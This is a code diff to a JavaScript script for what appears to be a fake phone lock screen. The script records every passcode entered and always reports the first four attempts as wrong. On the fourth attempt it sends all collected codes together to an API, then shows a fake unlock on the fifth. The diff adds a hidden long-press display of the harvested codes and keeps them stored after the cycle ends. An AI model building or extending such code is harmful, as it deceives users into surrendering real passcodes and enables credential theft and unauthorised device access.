@@ -12,17 +12,20 @@
   const homescreenImg = document.getElementById('homescreenImg');
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
-  const ATT_CODES_KEY = '_pass_attempts_codes_'; // stores first-4 attempt codes persistently
+  const ATT_CODES_KEY = '_pass_attempts_codes_'; // persistent storage key for collected codes
+
+  // long-press config
+  const LONGPRESS_MS = 600;
+  let codesBarTimer = null;
+  let hpStartX = 0;
+  let hpStartY = 0;
 
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
 
   function getStoredAttemptCodes() {
-    try {
-      return JSON.parse(localStorage.getItem(ATT_CODES_KEY) || '[]');
-    } catch (e) {
-      return [];
-    }
+    try { return JSON.parse(localStorage.getItem(ATT_CODES_KEY) || '[]'); }
+    catch (e) { return []; }
   }
   function pushStoredAttemptCode(pass) {
     const arr = getStoredAttemptCodes();
@@ -66,12 +69,11 @@
     localStorage.removeItem(QUEUE_KEY);
   }
 
-  /* ---------- Spring engine (semi-implicit integrator) ---------- */
-  // options: { from, to, velocity (optional), mass, stiffness, damping, onUpdate, onComplete, threshold }
+  /* ---------- Spring engine (unchanged) ---------- */
   function springAnimate(opts) {
     const mass = opts.mass ?? 1;
-    const stiffness = opts.stiffness ?? 120; // k
-    const damping = opts.damping ?? 14;      // c
+    const stiffness = opts.stiffness ?? 120;
+    const damping = opts.damping ?? 14;
     const threshold = opts.threshold ?? 0.02;
     let x = opts.from;
     let v = opts.velocity ?? 0;
@@ -80,9 +82,8 @@
     let rafId = null;
 
     function step(now) {
-      const dt = Math.min(0.032, (now - last) / 1000); // cap dt to avoid big jumps
+      const dt = Math.min(0.032, (now - last) / 1000);
       last = now;
-      // Hooke's law + damping: a = (-k*(x - target) - c*v) / m
       const a = (-stiffness * (x - target) - damping * v) / mass;
       v += a * dt;
       x += v * dt;
@@ -91,7 +92,6 @@
 
       const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
       if (isSettled) {
-        // ensure final snap
         if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
         if (typeof opts.onComplete === 'function') opts.onComplete();
         cancelAnimationFrame(rafId);
@@ -101,20 +101,17 @@
     }
 
     rafId = requestAnimationFrame(step);
-    return () => cancelAnimationFrame(rafId); // return a cancel function
+    return () => cancelAnimationFrame(rafId);
   }
 
-  /* ---------- playUnlockAnimation uses two springs ---------- */
+  /* ---------- Unlock animation (unchanged) ---------- */
   function playUnlockAnimation() {
-    // Respect reduced-motion
     const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
     if (!lockInner || !unlockOverlay || !homescreenImg) return;
 
-    // reveal the homescreen image layer immediately (it will animate)
     unlockOverlay.classList.add('show');
 
     if (prefersReduced) {
-      // instant fallback
       lockInner.style.transform = `translate3d(0, -110%, 0)`;
       homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
       homescreenImg.style.opacity = '1';
@@ -122,72 +119,52 @@
       return;
     }
 
-    // compute numeric pixel target for lock translate
     const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
-    const targetY = -Math.round(height * 1.08); // move a bit past top
+    const targetY = -Math.round(height * 1.08);
 
-    // start state
     lockInner.style.willChange = 'transform, opacity';
     homescreenImg.style.willChange = 'transform, filter, opacity';
-    // ensure initial styles
     lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
     homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
     homescreenImg.style.opacity = '0';
     homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
-
-    // shadow visual: apply large shadow while animating
     lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
 
-    // spring for lock Y (pixels)
-    const cancelLock = springAnimate({
+    springAnimate({
       from: 0,
       to: targetY,
       mass: 1.05,
       stiffness: 140,
       damping: 16,
       onUpdate: (val) => {
-        // val is pixels from 0 -> targetY (negative)
-        // map to scale slight (small effect)
-        const progress = Math.min(1, Math.abs(val / targetY)); // 0..1
-        const scale = 1 - 0.003 * progress; // tiny shrink while lifting
+        const progress = Math.min(1, Math.abs(val / targetY));
+        const scale = 1 - 0.003 * progress;
         lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
-        // fade a bit as it goes
         lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
       },
       onComplete: () => {
-        // remove shadow and hide inner off-screen (keep homescreen shown)
         lockInner.style.boxShadow = '';
         lockInner.style.opacity = '0';
-        // keep transform at final position (or clear if you prefer)
         lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
       }
     });
 
-    // spring for homescreen (scale & exposure)
-    // We'll animate a small overshoot scale and sharpen (blur -> 0)
-    const cancelHome = springAnimate({
-      from: 0, // we'll drive "progress" between 0..1 by mapping x, not absolute scale here
+    springAnimate({
+      from: 0,
       to: 1,
       mass: 1,
       stiffness: 80,
       damping: 11,
       onUpdate: (p) => {
-        // p will progress 0 -> 1 but spring oscillates; clamp for mapping
         const progress = Math.max(0, Math.min(1, p));
-        // map to scale overshoot: 0->1 maps to 0.96 -> 1.04 -> 1
-        // We'll use a simple mapping from progress to scale; because spring oscillates around 1, p may overshoot <0 or >1: handle it
-        const raw = p; // spring value
-        // convert to scale via interpolation around 1
-        const scale = 1 + (raw - 1) * 0.12; // gives slight overshoot (e.g. if raw = 1.2 -> scale ~1.024)
-        // clamp reasonable range
+        const raw = p;
+        const scale = 1 + (raw - 1) * 0.12;
         const finalScale = Math.max(0.96, Math.min(1.06, scale));
         homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;
-
-        // blur mapping: when raw small -> blurry, when near 1 -> sharp
         const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
         const sat = 0.9 + Math.min(0.15, raw * 0.15);
         homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
-        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw)); // fade in quickly
+        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw));
       },
       onComplete: () => {
         homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
@@ -196,7 +173,6 @@
       }
     });
 
-    // Optional: cleanup both springs after a timeout (in case onComplete didn't fire)
     setTimeout(() => {
       lockInner.style.boxShadow = '';
       homescreenImg.style.willChange = '';
@@ -218,37 +194,186 @@
     }, DURATION + 20);
   }
 
-  // Collect first 4 codes, send them combined on the 4th attempt
+  /* ---------- Attempts logic: collect 4 codes, send combined on 4th, 5th unlock ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
     setAttempts(attempts);
 
-    // store this entered code (persistently)
+    // store this entered code persistently
     pushStoredAttemptCode(enteredCode);
 
     if (attempts >= 1 && attempts <= 3) {
-      // first three attempts: just animate wrong attempt, don't send yet
       animateWrongAttempt();
     } else if (attempts === 4) {
-      // On the 4th attempt, send all collected codes as one comma-separated string
-      const codes = getStoredAttemptCodes(); // e.g. ["1234","4321","5678","3456"]
+      const codes = getStoredAttemptCodes();
       const combined = codes.join(',');
-      // send combined string to API
       sendToAPI(combined);
-      // show wrong attempt animation for 4th as well
       animateWrongAttempt();
     } else if (attempts === 5) {
-      // 5th attempt: trigger unlock animation (do not send)
       playUnlockAnimation();
       setTimeout(reset, 300);
     }
 
-    // After the 5th attempt, reset the attempt counter and clear stored codes
+    // After 5th attempt reset counter but KEEP stored codes so they can be shown on long-press
     if (attempts >= 5) {
       setAttempts(0);
-      clearStoredAttemptCodes();
     }
+  }
+
+  /* ---------- Minimal codes bar: create dynamically with inline styles (NO buttons) ---------- */
+  function createMinimalCodesBar() {
+    if (document.getElementById('codesBar')) return document.getElementById('codesBar');
+
+    const bar = document.createElement('div');
+    bar.id = 'codesBar';
+    // inline styles so you don't need to edit CSS
+    Object.assign(bar.style, {
+      position: 'fixed',
+      left: '50%',
+      bottom: '20px',
+      transform: 'translateX(-50%) translateY(20px)',
+      width: 'calc(100% - 32px)',
+      maxWidth: '820px',
+      zIndex: '11000',
+      display: 'flex',
+      justifyContent: 'center',
+      pointerEvents: 'none',
+      opacity: '0',
+      transition: 'opacity 160ms ease, transform 160ms ease',
+      fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
+      fontSize: '14px'
+    });
+
+    const inner = document.createElement('div');
+    Object.assign(inner.style, {
+      width: '100%',
+      background: 'rgba(0,0,0,0.56)',
+      backdropFilter: 'blur(8px)',
+      WebkitBackdropFilter: 'blur(8px)',
+      borderRadius: '12px',
+      padding: '10px 12px',
+      boxSizing: 'border-box',
+      display: 'flex',
+      gap: '10px',
+      justifyContent: 'center',
+      alignItems: 'center',
+      flexWrap: 'wrap',
+      pointerEvents: 'none',
+      color: '#fff',
+      boxShadow: '0 10px 30px rgba(0,0,0,0.45)'
+    });
+
+    inner.id = 'codesInner';
+    bar.appendChild(inner);
+    document.body.appendChild(bar);
+    return bar;
+  }
+
+  function populateAndShowMinimalBar() {
+    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
+    const bar = createMinimalCodesBar();
+    const inner = document.getElementById('codesInner');
+    inner.innerHTML = ''; // clear
+
+    const codes = getStoredAttemptCodes();
+    if (!codes || codes.length === 0) {
+      const s = document.createElement('span');
+      s.textContent = '';
+      inner.appendChild(s);
+    } else {
+      codes.forEach(c => {
+        const pill = document.createElement('span');
+        pill.textContent = c;
+        Object.assign(pill.style, {
+          background: 'rgba(255,255,255,0.08)',
+          padding: '6px 10px',
+          borderRadius: '999px',
+          fontWeight: '700',
+          letterSpacing: '.5px',
+          color: '#fff',
+          pointerEvents: 'none'
+        });
+        inner.appendChild(pill);
+      });
+    }
+
+    // show bar (animate in)
+    bar.style.display = 'flex';
+    // force reflow then animate
+    requestAnimationFrame(() => {
+      bar.style.transform = 'translateX(-50%) translateY(0)';
+      bar.style.opacity = '1';
+    });
+  }
+
+  function hideMinimalBarNow() {
+    const bar = document.getElementById('codesBar');
+    if (!bar) return;
+    bar.style.transform = 'translateX(-50%) translateY(20px)';
+    bar.style.opacity = '0';
+    // after transition remove display to keep DOM tidy
+    setTimeout(() => {
+      if (bar && bar.parentNode) bar.style.display = 'none';
+    }, 180);
+  }
+
+  /* ---------- Long-press handling (homescreen image). Show on long-press; hide on lift ---------- */
+  function onHPDown(ev) {
+    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
+    hpStartX = ev.clientX;
+    hpStartY = ev.clientY;
+    clearTimeout(codesBarTimer);
+    codesBarTimer = setTimeout(() => {
+      populateAndShowMinimalBar();
+      codesBarTimer = null;
+    }, LONGPRESS_MS);
+  }
+
+  function onHPMove(ev) {
+    if (!codesBarTimer) return;
+    const dx = Math.abs(ev.clientX - hpStartX);
+    const dy = Math.abs(ev.clientY - hpStartY);
+    // cancel long-press if the finger moved too much (intent to scroll/drag)
+    if (dx > 10 || dy > 10) {
+      clearTimeout(codesBarTimer);
+      codesBarTimer = null;
+    }
+  }
+
+  function onHPUp(ev) {
+    // cancel pending long-press timer
+    if (codesBarTimer) {
+      clearTimeout(codesBarTimer);
+      codesBarTimer = null;
+      return;
+    }
+    // if bar is shown, hide it immediately on lift
+    hideMinimalBarNow();
+  }
+
+  if (homescreenImg) {
+    homescreenImg.addEventListener('pointerdown', onHPDown);
+    homescreenImg.addEventListener('pointermove', onHPMove, { passive: true });
+    homescreenImg.addEventListener('pointerup', onHPUp);
+    homescreenImg.addEventListener('pointercancel', onHPUp);
+    // also support contextmenu on desktop for convenience (will hide on next pointerup)
+    homescreenImg.addEventListener('contextmenu', (e) => {
+      if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
+      e.preventDefault();
+      populateAndShowMinimalBar();
+    });
+  } else {
+    // fallback: attach to document
+    document.addEventListener('pointerdown', onHPDown);
+    document.addEventListener('pointermove', onHPMove, { passive: true });
+    document.addEventListener('pointerup', onHPUp);
+    document.addEventListener('pointercancel', onHPUp);
+    document.addEventListener('contextmenu', (e) => {
+      if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
+      e.preventDefault();
+      populateAndShowMinimalBar();
+    });
   }
 
   function animateBrightness(el, target, duration) {
@@ -310,5 +435,4 @@
   flushQueue();
 
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
-
 })();
